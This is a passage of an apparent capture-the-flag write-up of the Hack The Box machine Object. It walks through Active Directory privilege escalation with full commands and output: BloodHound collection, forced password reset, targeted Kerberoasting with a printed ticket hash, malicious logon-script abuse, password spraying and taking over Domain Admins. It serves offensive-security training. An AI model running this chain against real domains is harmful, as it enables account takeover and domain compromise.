d-----       10/26/2021   7:59 AM                maria
d-----       10/26/2021   7:58 AM                oliver
d-r---        4/10/2020  10:49 AM                Public
d-----       10/21/2021   3:44 AM                smith

```

Looking at the listening ports, there are a lot that were not accessible from the outside:

```
*Evil-WinRM* PS C:\Users\oliver\desktop> netstat -an | findstr LISTENING
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING
  TCP    0.0.0.0:88             0.0.0.0:0              LISTENING
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING
  TCP    0.0.0.0:389            0.0.0.0:0              LISTENING
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING
  TCP    0.0.0.0:464            0.0.0.0:0              LISTENING
  TCP    0.0.0.0:593            0.0.0.0:0              LISTENING
  TCP    0.0.0.0:636            0.0.0.0:0              LISTENING
  TCP    0.0.0.0:3268           0.0.0.0:0              LISTENING
  TCP    0.0.0.0:3269           0.0.0.0:0              LISTENING
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING
  TCP    0.0.0.0:8080           0.0.0.0:0              LISTENING
  TCP    0.0.0.0:9389           0.0.0.0:0              LISTENING
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49673          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49674          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49684          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49692          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:60867          0.0.0.0:0              LISTENING
  TCP    10.10.11.132:53        0.0.0.0:0              LISTENING
  TCP    10.10.11.132:139       0.0.0.0:0              LISTENING
  TCP    127.0.0.1:53           0.0.0.0:0              LISTENING
...[snip]...

```

Given the various ports open, this looks like a domain controller.

### Bloodhound

#### Collect Data

I’ll download `SharpHound.exe` from [here](https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.exe) and upload it to Object:

```
*Evil-WinRM* PS C:\programdata> upload SharpHound.exe
Info: Uploading SharpHound.exe to C:\programdata\SharpHound.exe

Data: 1177600 bytes of 1177600 bytes copied

Info: Upload successful!

```

Unfortunately, it doesn’t run:

```
*Evil-WinRM* PS C:\programdata> .\sharphound.exe                                                         
2022-02-27T11:04:34.8154550-08:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote                                        
2022-02-27T11:04:34.8311111-08:00|INFORMATION|Initializing SharpHound at 11:04 AM on 2/27/2022
2022-02-27T11:04:35.0029449-08:00|ERROR|Unable to connect to LDAP, verify your credentials
*Evil-WinRM* PS C:\programdata> .\sharphound.exe -c all                
2022-02-27T11:04:59.5341928-08:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote               
2022-02-27T11:04:59.5498244-08:00|INFORMATION|Initializing SharpHound at 11:04 AM on 2/27/2022
2022-02-27T11:04:59.6904929-08:00|ERROR|Unable to connect to LDAP, verify your credentials

```

YB1 pointed out to me that there’s [an open issue](https://github.com/BloodHoundAD/SharpHound/issues/10) for this on the SharpHound GitHub.

There typically is also a `SharpHound.ps1`, but it’s missing from GitHub. Looking at the history, it was removed a few weeks ago:

[![image-20220227141846798](https://0xdfimages.gitlab.io/img/image-20220227141846798.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220227141846798.png)

I can go back to the previous commit and download the PowerShell script from there. I’ll upload it and run it:

```
*Evil-WinRM* PS C:\programdata> upload SharpHound.ps1
Info: Uploading SharpHound.ps1 to C:\programdata\SharpHound.ps1

Data: 1298852 bytes of 1298852 bytes copied

Info: Upload successful!
*Evil-WinRM* PS C:\programdata> . .\SharpHound.ps1
*Evil-WinRM* PS C:\programdata> Invoke-BloodHound -CollectionMethod All
*Evil-WinRM* PS C:\programdata> ls

    Directory: C:\programdata

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d---s-       10/21/2021   3:13 AM                Microsoft
d-----       10/21/2021  12:05 AM                regid.1991-06.com.microsoft
d-----        9/15/2018  12:19 AM                SoftwareDistribution
d-----        4/10/2020   5:48 AM                ssh
d-----        4/10/2020  10:49 AM                USOPrivate
d-----        4/10/2020  10:49 AM                USOShared
d-----        8/25/2021   2:57 AM                VMware
-a----        2/27/2022  11:17 AM           8980 20220227111707_BloodHound.zip
-a----        2/27/2022  11:17 AM          10043 MWU2MmE0MDctMjBkZi00N2VjLTliOTMtYThjYTY4MjdhZDA2.bin
-a----        2/27/2022  11:04 AM         883200 SharpHound.exe
-a----        2/27/2022  11:15 AM         974139 SharpHound.ps1

```

The Zip archive is the results, which I’ll download to my VM:

```
*Evil-WinRM* PS C:\programdata> download C:\programdata\20220227174044_BloodHound.zip 20220227174044_BloodHound.zip
Info: Downloading C:\programdata\20220227174044_BloodHound.zip to 20220227174044_BloodHound.zip

Info: Download successful!

```

#### Analysis

I’ll load that data into BloodHound and take a look. It important to not use the newest version of BloodHound (4.1+), as the data from this older PS1 file won’t load. So I found the release before they removed the PowerShell collector and used that, [4.0.3](https://github.com/BloodHoundAD/BloodHound/releases/tag/4.0.3).

First I’ll find oliver and mark that user as owned. The first place to look is the “Outbound Control Rights”, which shows oliver has `ForceChangePassword` over smith.

![image-20220227210442678](https://0xdfimages.gitlab.io/img/image-20220227210442678.png)

Doing the same for smith, shows that user has `GenericWrite` over maria, and maria has `WriteOwner` over Domain Admins.

One of the pre-canned queries under “Analysis”, “Find Shortest Paths to Domain Admins”, actually shows the full path:

[![image-20220227210342139](https://0xdfimages.gitlab.io/img/image-20220227210342139.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220227210342139.png)

### Change smith’s Password

BloodHound’s help on `ForceChangePassword` can be loaded by right clicking on the label:

![image-20220228054231102](https://0xdfimages.gitlab.io/img/image-20220228054231102.png)

It shows just how to do it using [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) on the “Abuse Info” tab:

![image-20220228054402736](https://0xdfimages.gitlab.io/img/image-20220228054402736.png)

I’ll download PowerView, upload it to Object, and import it into this session:

```
*Evil-WinRM* PS C:\programdata> upload PowerView.ps1
Info: Uploading PowerView.ps1 to C:\programdata\PowerView.ps1

Data: 1027036 bytes of 1027036 bytes copied

Info: Upload successful!
*Evil-WinRM* PS C:\programdata> . .\PowerView.ps1

```

As I already have a shell as oliver, I don’t need to pass that credential. I’ll just create a password and change it:

```
*Evil-WinRM* PS C:\programdata> $newpass = ConvertTo-SecureString '0xdf0xdf!' -AsPlainText -Force
*Evil-WinRM* PS C:\programdata> Set-DomainUserPassword -Identity smith -AccountPassword $newpass

```

### Evil-WinRM

smith is a member of Remote Management Users:

![image-20220228054030528](https://0xdfimages.gitlab.io/img/image-20220228054030528.png)

This means the account can connect over WinRM. With the new password, I’ll use [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) again:

```

oxdf@hacky$ evil-winrm -i 10.10.11.132 -u smith -p '0xdf0xdf!'

Evil-WinRM shell v3.3

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\smith\Documents>

```

## Shell as Maria

### Kerberoast

The help in BloodHound for `GenericWrite` says:

> A targeted kerberoast attack can be performed using PowerView’s Set-DomainObject along with Get-DomainSPNTicket.

I’ll add an SPN to maria’s account:

```
*Evil-WinRM* PS C:\programdata> Set-DomainObject -Identity maria -SET @{serviceprincipalname='nonexistent/0XDF'}

```

For some reason, this doesn’t take:

```
*Evil-WinRM* PS C:\programdata> Get-DomainUser maria | Select serviceprinciplename

serviceprinciplename
--------------------

```

~~It’s not clear to my why I can’t write this SPN, but it seems like a dead end.~~
*Update*: After publishing this bit, I got this reply on Twitter:

> Cool writeup !   
> You could actually set an SPN for Maria and kerberoast it. You had to provide Smith's credential object but the hash was not crackable anyways :( . You can find how I did it here <https://t.co/TkuUqrmL2o>
>
> — morph3 (@melihkaanyldz) [March 1, 2022](https://twitter.com/melihkaanyldz/status/1498635702300549123?ref_src=twsrc%5Etfw)

This wasn’t quite right, as because the shell is already running as smith, the cred isn’t necessary. It seems that my instance of Object was just in a bad state. On a reset:

```
*Evil-WinRM* PS C:\programdata> Set-DomainObject -Identity maria -SET @{serviceprincipalname='nonexistent/0XDF'}
*Evil-WinRM* PS C:\programdata> Get-DomainUser maria | Select serviceprincipalname

serviceprincipalname
--------------------
nonexistent/0XDF

```

But in subsequent replies on Twitter, morph3 did show how to do it using `setspn` (a [binary](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241(v=ws.11)) that should be on DC). That works as well, as now both SPNs are there:

```
*Evil-WinRM* PS C:\programdata> setspn -a MSSQLSvc/object.local:1433 object.local\maria
Checking domain DC=object,DC=local
CN=maria garcia,CN=Users,DC=object,DC=local
        MSSQLSvc/object.local:1433

Updated object
*Evil-WinRM* PS C:\programdata> Get-DomainUser maria | Select serviceprincipalname

serviceprincipalname
--------------------
{object.local/maria.object.local:1337, nonexistent/0XDF}

```

To actually Kerberoast, I’ll need to use an SPN with a [valid format](https://docs.microsoft.com/en-us/windows/win32/ad/name-formats-for-unique-spns) (unlike `nonexistent/0xDF`), so I’ll use that one going forward.

`PowerView` has `Get-DomainSPNTicket` to Kerberoast, but it actually requires a credential object (even though I am logged in as smith):

```
*Evil-WinRM* PS C:\programdata> Get-DomainSPNTicket -SPN "MSSQLSvc/object.local:1433"
Warning: [Get-DomainSPNTicket] Error requesting ticket for SPN 'MSSQLSvc/object.local:1433' from user 'UNKNOWN' : Exception calling ".ctor" with "1" argument(s): "The NetworkCredentials provided were unable to c
reate a Kerberos credential, see inner exception for details."

```

The error message is about the credentials being invalid. I’ll create a credential object:

```
*Evil-WinRM* PS C:\programdata> $pass = ConvertTo-SecureString '0xdf0xdf!' -AsPlainText -Force 
*Evil-WinRM* PS C:\programdata> $cred = New-Object System.Management.Automation.PSCredential('object.local\smith', $pass)
*Evil-WinRM* PS C:\programdata> Get-DomainSPNTicket -SPN "MSSQLSvc/object.local:1433" -Credential $Cred
Warning: [Invoke-UserImpersonation] powershell.exe is not currently in a single-threaded apartment state, token impersonation may not work.
Warning: [Invoke-UserImpersonation] Executing LogonUser() with user: object.local\smith

SamAccountName       : UNKNOWN
DistinguishedName    : UNKNOWN
ServicePrincipalName : MSSQLSvc/object.local:1433
TicketByteHexStream  :
Hash                 : $krb5tgs$23$*UNKNOWN$UNKNOWN$MSSQLSvc/object.local:1433*$DAECA7C0ACC55F14934E5E8A382F7AD6$FB41B91C34D8B1139FD30A93B7C0534D7767606C940A162D6A08BD7A84C604FC6757E2EFB5CCEAC9B6B87052440E82F0A111663EE2E9153746E5C13296E39D2788BE41F4
81F2F2594F3D90011C2BDEFFC704613ACA9B3684A9F96B352E6DD0B0B0009C294DA4E8203AA43C0221F3263115899E7B77989CEF394E9402AA96BF768D515210FCEA3D4FFA7134D8F3B2D0C867C2C63B20164C01D78A607B5249A79CAAA334AF80BD5B0D21DA948440BF0E0BB68E4AE791
8DDAF8C860AC86EA7C21E95F29ACB53397C9F5F24A223ACEE9DCE22E255CEF0D7CB67E0F421A50D1F204ACC038D85D15716B33F0EB2B23E7A039ECAA67F4EA9327860970AD417406941EB771DB2B564096336524650D6C0D6EB1CA6BF108C339DDB9FA38DB0587F7EFBAEE98A3FE3449DB
4DA81E59224EA0467B4DC2F2576846DDEF787E3D7BA1C213D3248B7D5D5227E00E8CA6B480227CD69DDFD7ACC05FD2F907DA6B5BABF60D630BA12679323E02E541FF81B2522A8536BE1F534640AF12C1EADE7026859C82366915C64D45BB855432BD7E72EC1AA53B91D7A6D24E609694C2
5EA1D37AA66E5E92BE8BF9F6D1DC5E728E70F2295CDBBB2AA7651F2C2615D0ED861D8763F86F9FD5A5F5FB814F0914BC5A2185FD42A753905E28ABDA1DBD891F006C4217D412C1ACBF524B752D395C2055B6814526DF022A600A949779A98D61F80B774425F5D3D28D07F00863D71E5495
6F68353AA2102681E6931AF8CC09F18E20F3DEBABEE639F578850D0B6D9BD4FCE3CD0DA084AAA4A1805C0E4F012FEB64BB5AB86C748FAD3DDB2ED466C4FCB075C24C2C0B56A728BB65ADBE0F2013B45C79D9C515E3F418B7B7DBCE8B34AF370427670AB12EF1A6B67CFF93B07FD21B9A61
3D0BA3E034ACA27D2AB139F648A8AA1DAA3F3FD66EA26021855B55ADB32273B3C7D241BAFBE4E12A5F30AF5AB2EF8C4A141A41D27D567C9AFE0A1D2DB17E0BA357E13064D94E077F849D6E66ADD66F4015BE57C9FBF99E79C68ED18DC1F5916044F7ECF984F8397CF65C69776D8E432F4F
498B323AF1963081EE28C561BBF305D6FA9593813D3A9EFC24671C9540DE1CB7006FBB36847A987EFBDD754517BEE81D8322DC5F2C529C610591D1DE053D72F79A29506725C90C9369FB285A8C2D30090A403C6906FE0C61F3E31C397A3B03768B1061C3B7E69CFDA329F4CB3EA8286A66
1EC9CFF04C29F9BBC311AC53776C265C9DFEEDB85C4ECD5DC0DDEE64C87E9045A7632A792861B687F6358E138D11676BBFD2783D644B24837659B6F96F93AF529AFC43C32943583E4593B9BEA76B6778134C55B1EB3101CE390F3E9A494BDC927BA5FF2EF20720012FCF4270A8B1BFFA2A
1012D7C4CACB77AE9B8DE19C8671CB09DB0F15FA008658D9669553F3C5AB3C303694D23A0F409F72DF95336F9ED8898A66289FC15AAF0B9DF0432D69FAA156BF54BBEF237DFCF0139850C5C8896C65A6DA6A4A9712A6D21F2A883EF6F25D460E
Warning: [Invoke-RevertToSelf] Reverting token impersonation and closing LogonUser() token handle

```

I can try to crack that with `hashcat`, but as the password is not in a standard wordlist like `rockyou.txt`, it won’t crack without some extra effort beyond what is needed for HTB machines.

### Password Change Fail

Some [references](https://burmat.gitbook.io/security/hacking/domain-exploitation#reset-domain-user-password) I found suggested that `GenericWrite` could work to change the user’s password, but this didn’t work here:

```
*Evil-WinRM* PS C:\programdata> $newpass = ConvertTo-SecureString '0xdf0xdf!' -AsPlainText -Force
*Evil-WinRM* PS C:\programdata> Set-DomainUserPassword -Identity maria -AccountPassword $newpass
Warning: [Set-DomainUserPassword] Error setting password for user 'maria' : Exception calling "SetPassword" with "1" argument(s): "Access is denied. (Exception from HRESULT: 0x80070005 (E_ACCESSDENIED))"

```

### Logon Script

[HackTricks](https://book.hacktricks.xyz/windows/active-directory-methodology/acl-persistence-abuse#genericwrite-on-user) suggests I can use `GenericWrite` on a user to update their logon scripts. This script would run the next time the user logs in. That’s not typical on HTB/CTF machines, but it’s possibly something automated in the background.

I’ll write a script that will ping my host, remembering from the firewall enumeration earlier that ICMP is one of the few things allowed outbound, and set the script:

```
*Evil-WinRM* PS C:\programdata> echo "ping 10.10.14.6" > ping.ps1
*Evil-WinRM* PS C:\programdata> Set-DomainObject -Identity maria -SET @{scriptpath="C:\\programdata\\ping.ps1"}

```

Instantly there are packets at `tcpdump`:

```

oxdf@hacky$ sudo tcpdump -ni tun0 icmp                   
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode                 
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes                       
ec11:20:01.252961 IP 10.10.11.132 > 10.10.14.6: ICMP echo request, id 2, seq 11053, length 40
11:20:01.253007 IP 10.10.14.6 > 10.10.11.132: ICMP echo reply, id 2, seq 11053, length 40  
11:20:02.260576 IP 10.10.11.132 > 10.10.14.6: ICMP echo request, id 2, seq 11056, length 40
11:20:02.260615 IP 10.10.14.6 > 10.10.11.132: ICMP echo reply, id 2, seq 11056, length 40  
11:20:03.276421 IP 10.10.11.132 > 10.10.14.6: ICMP echo request, id 2, seq 11059, length 40
11:20:03.276457 IP 10.10.14.6 > 10.10.11.132: ICMP echo reply, id 2, seq 11059, length 40  
11:20:04.279746 IP 10.10.11.132 > 10.10.14.6: ICMP echo request, id 2, seq 11062, length 40
11:20:04.279779 IP 10.10.14.6 > 10.10.11.132: ICMP echo reply, id 2, seq 11062, length 40  
11:20:05.592129 IP 10.10.11.132 > 10.10.14.6: ICMP echo request, id 2, seq 11067, length 40
11:20:05.592188 IP 10.10.14.6 > 10.10.11.132: ICMP echo reply, id 2, seq 11067, length 40  
11:20:06.604067 IP 10.10.11.132 > 10.10.14.6: ICMP echo request, id 2, seq 11070, length 40
11:20:06.604103 IP 10.10.14.6 > 10.10.11.132: ICMP echo reply, id 2, seq 11070, length 40  
11:20:07.620145 IP 10.10.11.132 > 10.10.14.6: ICMP echo request, id 2, seq 11073, length 40
...[snip]..

```

I would have expected only five pings, but it goes on indefinitely until I change the script. It seems this logon script is being run repeatedly.

### Home Dir Enum

Because I know I can’t connect back because of the firewall, I’ll drop scripts into the logon that write results where I can read them. For example:

```
*Evil-WinRM* PS C:\programdata> echo "ls \users\maria\ > \programdata\out" > cmd.ps1
*Evil-WinRM* PS C:\programdata> Set-DomainObject -Identity maria -SET @{scriptpath="C:\\programdata\\cmd.ps1"}

```

About a second or so later there’s an `out`:

```
*Evil-WinRM* PS C:\programdata> type out

    Directory: C:\users\maria

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---       10/22/2021   3:54 AM                3D Objects
d-r---       10/22/2021   3:54 AM                Contacts
d-r---       10/25/2021   3:47 AM                Desktop
d-r---       10/25/2021  10:07 PM                Documents
d-r---       10/22/2021   3:54 AM                Downloads
d-r---       10/22/2021   3:54 AM                Favorites
d-r---       10/22/2021   3:54 AM                Links
d-r---       10/22/2021   3:54 AM                Music
d-r---       10/22/2021   3:54 AM                Pictures
d-r---       10/22/2021   3:54 AM                Saved Games
d-r---       10/22/2021   3:54 AM                Searches
d-r---       10/22/2021   3:54 AM                Videos

```

It’s interesting that the `Documents` and `Desktop` folders have different timestamp than the rest. I’ll list those directories:

```
*Evil-WinRM* PS C:\programdata> echo "ls \users\maria\documents > \programdata\out; ls \users\maria\desktop\ > \programdata\out2" > cmd.ps1
*Evil-WinRM* PS C:\programdata> ls out*

    Directory: C:\programdata

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        2/28/2022   3:42 AM              0 out
-a----        2/28/2022   3:42 AM            830 out2
*Evil-WinRM* PS C:\programdata> type out2

    Directory: C:\users\maria\desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       10/26/2021   8:13 AM           6144 Engines.xls

```

There’s a single file on the desktop. I’ll copy it to `programdata` and download it:

```
*Evil-WinRM* PS C:\programdata> echo "copy \users\maria\desktop\Engines.xls \programdata\" > cmd.ps1  
*Evil-WinRM* PS C:\programdata> ls Engines.xls

    Directory: C:\programdata

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       10/26/2021   8:13 AM           6144 Engines.xls
*Evil-WinRM* PS C:\programdata> download C:\programdata\Engines.xls Engines.xls
Info: Downloading C:\programdata\Engines.xls to Engines.xls

Info: Download successful!

```

### Engines.xls

The Excel file opens in LibreOffice `Calc` in my Linux VM, and it includes a list of machines and passwords for maria:

![image-20220228064648956](https://0xdfimages.gitlab.io/img/image-20220228064648956.png)

### WinRM

[crackmapexec](https://github.com/byt3bl33d3r/CrackMapExec) can quickly test each password for maria. I’ll save them into a text time, and run it:

```

oxdf@hacky$ crackmapexec winrm 10.10.11.132 -u maria -p maria-pass 
SMB         10.10.11.132    5985   NONE             [*] None (name:10.10.11.132) (domain:None)
HTTP        10.10.11.132    5985   NONE             [*] http://10.10.11.132:5985/wsman
WINRM       10.10.11.132    5985   NONE             [-] None\maria:d34gb8@
WINRM       10.10.11.132    5985   NONE             [-] None\maria:0de_434_d545
WINRM       10.10.11.132    5985   NONE             [+] None\maria:W3llcr4ft3d_4cls (Pwn3d!)

```

The last one works over WinRM for maria:

```

oxdf@hacky$ evil-winrm -i 10.10.11.132 -u maria -p 'W3llcr4ft3d_4cls'

Evil-WinRM shell v3.3

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\maria\Documents>

```

## Shell with Domain Admins

### Takeover Domain Admins Group

maria has `WriteOwner` on the Domain Admins group. From the help in BloodHound, this means maria can change the owner of the group.

I’ll import `PowerView.ps` and then assign maria as the owner of the group:

```
*Evil-WinRM* PS C:\programdata> Set-DomainObjectOwner -Identity 'Domain Admins' -OwnerIdentity 'maria'

```

I think there are some weird timing issues that can come up running this command that causes the command to fail (likely some cleanup cron setting the permissions back). Waiting a minute and running again worked.

As owner, maria can give maria full rights over the group:

```
*Evil-WinRM* PS C:\programdata> Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity maria -Rights All

```

Now maria can add themself to the group:

```
*Evil-WinRM* PS C:\programdata> Add-DomainGroupMember -Identity 'Domain Admins' -Members 'maria'

```

It worked:

```
*Evil-WinRM* PS C:\programdata> net user maria
User name                    maria
Full Name                    maria garcia
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            10/21/2021 8:16:32 PM
Password expires             Never
Password changeable          10/22/2021 8:16:32 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 C:\\programdata\\cmd.ps1
User profile
Home directory
Last logon                   2/28/2022 3:51:46 AM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *Domain Admins        *Domain Users
The command completed successfully.

```

### WinRM with Domain Admin

The group will not be in my current session:

```
*Evil-WinRM* PS C:\programdata> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                  Type             SID          Attributes
=========================================== ================ ============ ==================================================
Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448

```

But if I exit and reconnect, it will be:

```
*Evil-WinRM* PS C:\programdata> exit

Info: Exiting with code 0

oxdf@hacky$ evil-winrm -i 10.10.11.132 -u maria -p 'W3llcr4ft3d_4cls'

Evil-WinRM shell v3.3

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\maria\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                    Type             SID                                           Attributes
============================================= ================ ============================================= ===============================================================
Everyone                                      Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users               Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                                 Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access    Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                        Alias            S-1-5-32-544                                  Mandatory group, Enabled by default, Enabled group, Group owner
NT AUTHORITY\NETWORK                          Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users              Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization                Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
OBJECT\Domain Admins                          Group            S-1-5-21-4088429403-1159899800-2753317549-512 Mandatory group, Enabled by default, Enabled group
OBJECT\Denied RODC Password Replication Group Alias            S-1-5-21-4088429403-1159899800-2753317549-572 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY\NTLM Authentication              Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level          Label            S-1-16-12288

```

As an Administrator and Domain Admin, maria can now read `root.txt`:

```
*Evil-WinRM* PS C:\Users\administrator\desktop> type root.txt
6cc13722************************

```

## Beyond Root

### Identify Automation

I want to know how the automation works to simulate maria’s login activity. `Get-ScheduledTask` as an admin will show all the scheduled tasks:

```
*Evil-WinRM* PS C:\> get-scheduledtask | findstr /v Disabled

TaskPath                                       TaskName                          State
--------                                       --------                          -----
\                                              CreateExplorerShellUnelevatedTask Running
\                                              dsacls                            Running
\                                              Jenkins                           Ready
\                                              RunLogOn                          Running
\                                              User_Feed_Synchronization-{52F... Ready
\Microsoft\Windows\.NET Framework\             .NET Framework NGEN v4.0.30319    Ready  
\Microsoft\Windows\.NET Framework\             .NET Framework NGEN v4.0.30319 64 Ready
\Microsoft\Windows\Active Directory Rights ... AD RMS Rights Policy Template ... Ready
\Microsoft\Windows\AppID\                      EDP Policy Manager                Ready
...[snip]...

```

`RunLogOn` seems promising.

I’ll save that task into a variable, and explore it a bit:

```
*Evil-WinRM* PS C:\> $task = get-scheduledtask -taskname RunLogOn

```

The top level object doesn’t have much useful information, other than it looks to be constantly running:

```
*Evil-WinRM* PS C:\> $task | fl

Actions            : {MSFT_TaskExecAction}
Author             : OBJECT\administrator
Date               : 2021-10-22T04:06:20.0065866
Description        :
Documentation      :
Principal          : MSFT_TaskPrincipal2
SecurityDescriptor :
Settings           : MSFT_TaskSettings3
Source             :
State              : Running
TaskName           : RunLogOn
TaskPath           : \
Triggers           : {MSFT_TaskLogonTrigger}
URI                : \RunLogOn
Version            :
PSComputerName     :

```

`$task.Actions.Execute` has the path to the script that is run:

```
*Evil-WinRM* PS C:\> $task.Actions | fl

Id               :
Arguments        :
Execute          : C:\Users\maria\AppData\Roaming\LogonJob\run.bat
WorkingDirectory :
PSComputerName   :

```

`$task.Principal.UserId` shows it will run as maria:

```
*Evil-WinRM* PS C:\> $task.Principal | fl

DisplayName         :
GroupId             :
Id                  : Author
LogonType           : Password
RunLevel            : Limited
UserId              : maria
ProcessTokenSidType : Default
RequiredPrivilege   :
PSComputerName      :

```

### run.bat / do.ps1

There are actually two files in the folder containing `run.bat`:

```
*Evil-WinRM* PS C:\Users\maria\appdata\roaming\logonjob> ls

    Directory: C:\Users\maria\appdata\roaming\logonjob

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       10/22/2021   3:57 AM             82 do.ps1
-a----       10/22/2021   4:03 AM            157 run.bat

```

`run.bat` starts a loop where it runs the `do.ps1` script with PowerShell, then pings localhost 5 times, and the loops.

```

@echo off

:LOOP

START /B powershell -ep bypass C:\Users\maria\Appdata\Roaming\LogonJob\do.ps1
ping 127.0.0.1 -n 5 > nul
cls

GOTO :LOOP

:EXIT

```

`ping` is often used as a sleep function in batch scripting because there is no sleep, and each ping takes about one second.

`do.ps1` is just two lines:

```

$path=(Get-ADUser maria -Properties ScriptPath).ScriptPath
powershell -File $path

```

It fetches the logon script associated with maria’s account, and runs it with PowerShell.